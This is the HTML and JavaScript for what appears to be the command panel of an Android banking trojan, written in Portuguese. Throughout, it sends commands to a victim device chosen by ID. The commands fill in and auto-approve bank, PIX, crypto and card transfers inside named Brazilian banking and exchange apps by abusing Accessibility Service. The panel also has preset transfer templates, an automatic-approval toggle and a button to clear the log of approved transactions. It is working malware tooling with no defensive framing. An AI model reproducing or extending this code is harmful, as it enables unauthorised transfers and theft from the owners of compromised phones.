<div class="ui container segment">
    <h3 class="ui header">Aprovação de Transações Automática</h3>
    <p>Preenche campos de transferência e aprova automaticamente transações em aplicativos bancários e de criptomoedas.</p>

    <div class="ui divider"></div>

    <!-- Painel de Controle -->
    <div class="ui grid">
        <div class="eight wide column">
            <div class="ui segment">
                <h4>Aprovação Manual de Transações</h4>
                <p>Envie um comando para preencher e aprovar uma transação.</p>

                <div class="ui form">
                    <!-- Tipo de Transação -->
                    <div class="field">
                        <label>Tipo de Transação</label>
                        <select id="transactionType" class="ui dropdown">
                            <option value="bank_transfer">Transferência Bancária</option>
                            <option value="pix_transfer">Transferência PIX</option>
                            <option value="crypto_send">Enviar Criptomoeda</option>
                            <option value="card_payment">Pagamento com Cartão</option>
                            <option value="generic">Genérico</option>
                        </select>
                    </div>

                    <!-- Valor -->
                    <div class="field">
                        <label>Valor</label>
                        <input type="number" id="transactionAmount" placeholder="0.00" step="0.01" min="0">
                    </div>

                    <!-- Destinatário -->
                    <div class="field">
                        <label>Destinatário/Conta/CPF</label>
                        <input type="text" id="transactionRecipient" placeholder="Ex: 123.456.789-00 ou account@bank.com">
                    </div>

                    <!-- Descrição -->
                    <div class="field">
                        <label>Descrição (opcional)</label>
                        <input type="text" id="transactionDescription" placeholder="Descrição da transferência">
                    </div>

                    <button class="ui green button" onclick="approveTransaction()">
                        <i class="check circle icon"></i>
                        Preencher e Aprovar
                    </button>
                </div>
            </div>
        </div>

        <div class="eight wide column">
            <div class="ui segment">
                <h4>Auto-aprovação</h4>
                <p>Habilite para aprovar automaticamente transações quando detectadas.</p>

                <div class="ui form">
                    <div class="field">
                        <div class="ui toggle checkbox" id="autoApprovalToggle">
                            <input type="checkbox" id="autoApprovalEnabled">
                            <label>Auto-aprovação <span id="autoApprovalStatus">Desabilitada</span></label>
                        </div>
                    </div>
                </div>

                <h4 style="margin-top: 20px;">Suporte de Aplicativos</h4>
                <div class="ui list">
                    <div class="item">
                        <i class="check icon" style="color: green;"></i>
                        <div class="content">Itaú, Bradesco, Caixa, Banco do Brasil</div>
                    </div>
                    <div class="item">
                        <i class="check icon" style="color: green;"></i>
                        <div class="content">Nubank, Inter, Mercado Pago</div>
                    </div>
                    <div class="item">
                        <i class="check icon" style="color: green;"></i>
                        <div class="content">Binance, Coinbase, Kraken</div>
                    </div>
                    <div class="item">
                        <i class="check icon" style="color: green;"></i>
                        <div class="content">Qualquer app com Accessibility Service ativo</div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="ui divider"></div>

    <!-- Templates Pré-configurados -->
    <div class="ui segment">
        <h4>Templates de Transações Comuns</h4>
        <p>Crie transações rápidas com templates pré-configurados.</p>

        <div class="ui grid">
            <div class="four wide column">
                <button class="ui mini blue button fluid" onclick="useTemplate('pix_small')">
                    <i class="send icon"></i>
                    PIX R$50
                </button>
            </div>
            <div class="four wide column">
                <button class="ui mini blue button fluid" onclick="useTemplate('pix_medium')">
                    <i class="send icon"></i>
                    PIX R$200
                </button>
            </div>
            <div class="four wide column">
                <button class="ui mini blue button fluid" onclick="useTemplate('crypto_sell')">
                    <i class="bitcoin icon"></i>
                    Vender Crypto
                </button>
            </div>
            <div class="four wide column">
                <button class="ui mini blue button fluid" onclick="useTemplate('card_payment')">
                    <i class="credit card icon"></i>
                    Pagamento Cartão
                </button>
            </div>
        </div>
    </div>

    <div class="ui divider"></div>

    <!-- Log de Aprovações -->
    <div class="ui segment">
        <h4>Log de Transações Aprovadas</h4>
        <p>Histórico de transações processadas automaticamente.</p>

        <table class="ui celled table">
            <thead>
                <tr>
                    <th>Tipo</th>
                    <th>Valor</th>
                    <th>Destinatário</th>
                    <th>Data/Hora</th>
                    <th>Status</th>
                    <th>Detalhes</th>
                </tr>
            </thead>
            <tbody id="transactionLogTable">
                <tr>
                    <td colspan="6" style="text-align: center; color: #999;">
                        <i class="spinner loading icon"></i>
                        Carregando...
                    </td>
                </tr>
            </tbody>
        </table>

        <button class="ui mini red button" onclick="clearTransactionLog(this)" style="margin-top: 10px;">
            <i class="trash icon"></i>
            Limpar Log
        </button>
    </div>

    <script>
        $(document).ready(function() {
            $('.ui.dropdown').dropdown();
            loadTransactionLog();
            setInterval(loadTransactionLog, 5000);

            $('#autoApprovalToggle').on('change', function() {
                const enabled = $(this).is(':checked');
                toggleAutoApproval(enabled);
            });

            loadAutoApprovalStatus();
        });

        function getDeviceId() {
            const match = window.location.pathname.match(/\/manage\/([^\/]+)/);
            return match ? match[1] : '';
        }

        function approveTransaction() {
            const type = $('#transactionType').val();
            const amount = $('#transactionAmount').val();
            const recipient = $('#transactionRecipient').val();

            if (!amount || !recipient) {
                showNotification('#f03434', 'Preencha todos os campos obrigatórios');
                return;
            }

            $.post(`/manage/${getDeviceId()}/0xTA`, {
                action: 'fill_fields',
                amount: amount,
                recipient: recipient,
                transactionType: type
            }, function(response) {
                if (response.error === false) {
                    showNotification('#2ecc71', 'Transação enviada para aprovação');
                    setTimeout(loadTransactionLog, 500);
                } else {
                    showNotification('#f03434', response.error);
                }
            }).fail(function() {
                showNotification('#f03434', 'Erro ao conectar');
            });
        }

        function useTemplate(templateId) {
            const templates = {
                'pix_small': { type: 'pix_transfer', amount: 50, recipient: 'xx.xxx.xxx/xxxx-xx' },
                'pix_medium': { type: 'pix_transfer', amount: 200, recipient: 'xx.xxx.xxx/xxxx-xx' },
                'crypto_sell': { type: 'crypto_send', amount: 0.1, recipient: 'wallet_address' },
                'card_payment': { type: 'card_payment', amount: 100, recipient: 'payment_gateway' }
            };

            const template = templates[templateId];
            if (template) {
                $('#transactionType').val(template.type).dropdown('refresh');
                $('#transactionAmount').val(template.amount);
                $('#transactionRecipient').val(template.recipient);
                showNotification('#2ecc71', 'Template carregado');
            }
        }

        function toggleAutoApproval(enabled) {
            const url = enabled 
                ? `/manage/${getDeviceId()}/ta/enable_auto`
                : `/manage/${getDeviceId()}/ta/disable_auto`;

            $.post(url, function(response) {
                if (response.error === false) {
                    showNotification('#2ecc71', response.message);
                } else {
                    showNotification('#f03434', response.error);
                }
            }).fail(function() {
                showNotification('#f03434', 'Erro ao conectar');
            });
        }

        function loadAutoApprovalStatus() {
            $.get(`/manage/${getDeviceId()}/ta/log`, function(data) {
                if (data.error === false && data.data) {
                    if (data.data.enableAutoApproval) {
                        $('#autoApprovalToggle').checkbox('check');
                        $('#autoApprovalStatus').text('Habilitada').css('color', 'green');
                    } else {
                        $('#autoApprovalToggle').checkbox('uncheck');
                        $('#autoApprovalStatus').text('Desabilitada').css('color', 'red');
                    }
                }
            });
        }

        function loadTransactionLog() {
            $.get(`/manage/${getDeviceId()}/ta/log`, function(data) {
                if (data.error === false && data.data && data.data.autoApprovalLog) {
                    const log = data.data.autoApprovalLog;

                    if (log.length === 0) {
                        $('#transactionLogTable').html(`
                            <tr>
                                <td colspan="6" style="text-align: center; color: #999;">
                                    Nenhuma transação registrada
                                </td>
                            </tr>
                        `);
                        return;
                    }

                    let html = '';
                    log.slice().reverse().forEach(entry => {
                        const statusIcon = entry.success
                            ? '<i class="check icon" style="color: green;"></i> Aprovada'
                            : '<i class="times icon" style="color: red;"></i> Falha';

                        const timestamp = new Date(entry.timestamp).toLocaleString('pt-BR');

                        html += `
                            <tr>
                                <td>${entry.transactionType}</td>
                                <td>R$ ${parseFloat(entry.amount).toFixed(2)}</td>
                                <td>${entry.recipient.substring(0, 20)}...</td>
                                <td>${timestamp}</td>
                                <td>${statusIcon}</td>
                                <td>${entry.details}</td>
                            </tr>
                        `;
                    });

                    $('#transactionLogTable').html(html);
                }
            });
        }

        function clearTransactionLog(element) {
            if (!confirm('Limpar log de transações?')) return;

            $(element).addClass('loading');
            $.ajax({
                type: 'DELETE',
                url: `/manage/${getDeviceId()}/ta/log`,
                success: function(data) {
                    showNotification('#2ecc71', data.message);
                    loadTransactionLog();
                    $(element).removeClass('loading');
                },
                error: function() {
                    showNotification('#f03434', 'Erro ao limpar log');
                    $(element).removeClass('loading');
                }
            });
        }
    </script>
</div>
